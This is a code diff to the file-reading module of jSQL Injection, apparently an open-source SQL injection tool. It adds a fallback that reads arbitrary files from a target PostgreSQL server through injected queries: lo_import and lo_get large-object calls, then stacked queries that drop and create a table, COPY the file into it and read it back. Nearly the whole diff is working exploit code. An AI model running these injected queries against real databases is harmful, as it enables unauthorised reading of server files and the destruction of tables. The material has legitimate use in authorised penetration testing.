@@ -3,6 +3,7 @@ package com.jsql.model.accessible;
 import com.jsql.model.InjectionModel;
 import com.jsql.model.bean.database.MockElement;
 import com.jsql.model.exception.InjectionFailureException;
+import com.jsql.model.exception.JSqlException;
 import com.jsql.model.exception.StoppedByUserSlidingException;
 import com.jsql.model.suspendable.SuspendableGetRows;
 import com.jsql.util.LogLevelUtil;
@@ -80,20 +81,27 @@ public class CallableFile implements Callable<CallableFile> {
                         "pg#file"
                     );
                 } catch (InjectionFailureException e) {
-                    LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Read failure, retrying with stack read");
-                    var nameLibraryRandom = "tmp_"+ RandomStringUtils.secure().nextAlphabetic(8);  // no dash in table name
-                    this.injectionModel.injectWithoutIndex(";drop table "+ nameLibraryRandom +";", "pg#drop-tbl");
-                    this.injectionModel.injectWithoutIndex(";create table "+ nameLibraryRandom +"(data text);", "pg#add-tbl");
-                    this.injectionModel.injectWithoutIndex(";copy "+ nameLibraryRandom +"(data) from '"+ this.pathFile +"' delimiter E'\\x01';", "pg#copy");
-                    resultToParse = this.suspendableReadFile.run(
-                        "array_to_string(array(select * from "+ nameLibraryRandom +"),'\\n')",
-                        sourcePage,
-                        false,
-                        1,
-                        MockElement.MOCK,
-                        "pg#get-tbl"
-                    );
-                    this.injectionModel.injectWithoutIndex(";drop table "+ nameLibraryRandom +";", "pg#drop-tbl");
+                    LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Read data folder failure, trying with large object");
+                    var loid = this.getResult("SELECT lo_import('"+ this.pathFile +"')::text", "pg#add-loid");
+                    if (StringUtils.isNotEmpty(loid)) {
+                        resultToParse = this.getResult("SELECT convert_from(lo_get("+ loid +"),'utf8')::text", "pg#read-lo");
+                    }
+                    if (StringUtils.isEmpty(resultToParse)) {
+                        LOGGER.log(LogLevelUtil.CONSOLE_DEFAULT, "Read large object failure, trying with stack read");
+                        var nameLibraryRandom = "tmp_" + RandomStringUtils.secure().nextAlphabetic(8);  // no dash in table name
+                        this.injectionModel.injectWithoutIndex(";drop table " + nameLibraryRandom + ";", "pg#drop-tbl");
+                        this.injectionModel.injectWithoutIndex(";create table " + nameLibraryRandom + "(data text);", "pg#add-tbl");
+                        this.injectionModel.injectWithoutIndex(";copy " + nameLibraryRandom + "(data) from '" + this.pathFile + "' delimiter E'\\x01';", "pg#copy");
+                        resultToParse = this.suspendableReadFile.run(
+                            "array_to_string(array(select * from " + nameLibraryRandom + "),'\\n')",
+                            sourcePage,
+                            false,
+                            1,
+                            MockElement.MOCK,
+                            "pg#get-tbl"
+                        );
+                        this.injectionModel.injectWithoutIndex(";drop table " + nameLibraryRandom + ";", "pg#drop-tbl");
+                    }
                 }
             }
         } catch (InjectionFailureException e) {
@@ -112,8 +120,23 @@ public class CallableFile implements Callable<CallableFile> {
         this.sourceFile = resultToParse;
         return this;
     }
-    
-    
+
+    public String getResult(String query, String metadata) {
+        var sourcePage = new String[]{ StringUtils.EMPTY };
+        try {
+            return new SuspendableGetRows(this.injectionModel).run(
+                query,
+                sourcePage,
+                false,
+                0,
+                MockElement.MOCK,
+                metadata
+            );
+        } catch (JSqlException ignored) {
+            return StringUtils.EMPTY;
+        }
+    }
+
     // Getters
     
     public String getPathFile() {
